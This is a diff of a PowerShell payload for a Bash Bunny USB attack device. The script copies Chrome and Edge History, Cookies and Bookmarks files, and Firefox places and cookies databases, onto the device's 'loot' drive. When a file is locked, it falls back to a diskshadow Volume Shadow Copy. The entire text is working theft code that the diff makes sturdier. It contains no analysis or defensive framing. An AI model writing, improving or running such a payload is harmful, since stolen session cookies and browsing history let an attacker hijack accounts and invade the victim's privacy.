@@ -4,55 +4,78 @@
 #############################################
 
 # --- Detect Bash Bunny drive ---
-$usb = Get-WmiObject Win32_LogicalDisk |
+$usbDrive = Get-WmiObject Win32_LogicalDisk |
     Where-Object {
         $_.DriveType -eq 2 -and (Test-Path "$($_.DeviceID)\loot")
     } |
-    Select-Object -ExpandProperty DeviceID
+    Select-Object -ExpandProperty DeviceID -First 1
 
-if (-not $usb) {
-    Write-Output "[-] Bash Bunny drive not found."
+if (-not $usbDrive) {
+    Write-Output "[-] ERROR: Bash Bunny loot drive not found."
     exit
 }
 
-Write-Output "[+] Bash Bunny detected on $usb"
+Write-Output "[+] Bash Bunny detected on drive $usbDrive"
 
-# --- Set loot directory ---
-$loot = "$usb\loot\browser_artifacts"
+# Normalized loot path
+$loot = Join-Path $usbDrive "loot\browser_artifacts"
+
+# Ensure loot folder exists
 New-Item -ItemType Directory -Force -Path $loot | Out-Null
 Write-Output "[+] Loot folder: $loot"
 
 
 #############################################
-#   Function: Safe Copy (shadow-copy fallback)
+#   Function: Safe Copy with Shadow Fallback
 #############################################
 
 function Copy-Safe {
-    param($source, $dest)
+    param(
+        [string]$source,
+        [string]$dest
+    )
+
+    if (!(Test-Path $source)) {
+        return
+    }
 
     try {
-        Copy-Item $source $dest -ErrorAction Stop
+        Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
+        Write-Output "[+] Copied: $source"
         return
-    } catch {
-        # Try shadow-copy fallback
-        Write-Output "[-] Normal copy failed for $source, attempting shadow copy..."
+    }
+    catch {
+        Write-Output "[-] Normal copy failed for $source"
+    }
 
-        diskshadow /s {
-            SET CONTEXT PERSISTENT
-            BEGIN BACKUP
-            ADD VOLUME C: ALIAS vol1
-            CREATE
-            END BACKUP
-        } | Out-Null
+    # --- Shadow Copy Fallback ---
+    Write-Output "[*] Attempting shadow copy..."
 
-        $shadowPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
-        $fullPath = $source.Replace("C:", $shadowPath)
+    $shadowScript = @"
+SET CONTEXT CLIENT ACCESSIBLE
+BEGIN BACKUP
+ADD VOLUME C: ALIAS vol1
+CREATE
+END BACKUP
+"@
+
+    $shadowFile = "$env:TEMP\shadow.txt"
+    $shadowScript | Out-File $shadowFile -Encoding ASCII
+
+    diskshadow /s $shadowFile | Out-Null
+
+    # Locate created shadow copy
+    $shadow = (vssadmin list shadows | Select-String "Shadow Copy Volume:").Line
+    if ($shadow -match "Shadow Copy Volume:\s+(.*)$") {
+        $shadowPath = $matches[1].Trim()
+        $shadowSource = $source.Replace("C:", $shadowPath)
 
         try {
-            Copy-Item $fullPath $dest -Force
-            Write-Output "[+] Shadow copy successful for: $source"
-        } catch {
-            Write-Output "[-] Shadow copy failed for: $source"
+            Copy-Item $shadowSource $dest -Force
+            Write-Output "[+] Shadow copy successful for $source"
+        }
+        catch {
+            Write-Output "[-] Shadow copy failed for $source"
         }
     }
 }
@@ -62,39 +85,39 @@ function Copy-Safe {
 #          Chrome Collection
 #############################################
 
-$chromePaths = @(
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
-)
-
-$chromeDest = "$loot\Chrome"
+$chromeUser = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$chromeDest = Join-Path $loot "Chrome"
 New-Item -ItemType Directory -Force -Path $chromeDest | Out-Null
 
-foreach ($path in $chromePaths) {
-    if (Test-Path $path) {
-        Copy-Safe $path $chromeDest
-    }
+$chromeTargets = @(
+    "Default\History",
+    "Default\Cookies",
+    "Default\Bookmarks"
+)
+
+foreach ($item in $chromeTargets) {
+    $path = Join-Path $chromeUser $item
+    Copy-Safe -source $path -dest $chromeDest
 }
 
 
 #############################################
-#              Edge Collection
+#               Edge Collection
 #############################################
 
-$edgePaths = @(
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"
-)
-
-$edgeDest = "$loot\Edge"
+$edgeUser = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+$edgeDest = Join-Path $loot "Edge"
 New-Item -ItemType Directory -Force -Path $edgeDest | Out-Null
 
-foreach ($path in $edgePaths) {
-    if (Test-Path $path) {
-        Copy-Safe $path $edgeDest
-    }
+$edgeTargets = @(
+    "Default\History",
+    "Default\Cookies",
+    "Default\Bookmarks"
+)
+
+foreach ($item in $edgeTargets) {
+    $path = Join-Path $edgeUser $item
+    Copy-Safe -source $path -dest $edgeDest
 }
 
 
@@ -103,17 +126,22 @@ foreach ($path in $edgePaths) {
 #############################################
 
 $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
-$ffDest  = "$loot\Firefox"
+$ffDest = Join-Path $loot "Firefox"
 
 if (Test-Path $ffBase) {
     New-Item -ItemType Directory -Force -Path $ffDest | Out-Null
 
-    foreach ($profile in Get-ChildItem $ffBase) {
-        $pDest = "$ffDest\$($profile.Name)"
+    foreach ($profile in Get-ChildItem $ffBase -Directory) {
+
+        $pDest = Join-Path $ffDest $profile.Name
         New-Item -ItemType Directory -Force -Path $pDest | Out-Null
 
-        Copy-Safe "$($profile.FullName)\places.sqlite"  $pDest
-        Copy-Safe "$($profile.FullName)\cookies.sqlite" $pDest
+        $files = @("places.sqlite", "cookies.sqlite")
+
+        foreach ($f in $files) {
+            $full = Join-Path $profile.FullName $f
+            Copy-Safe -source $full -dest $pDest
+        }
     }
 }
 
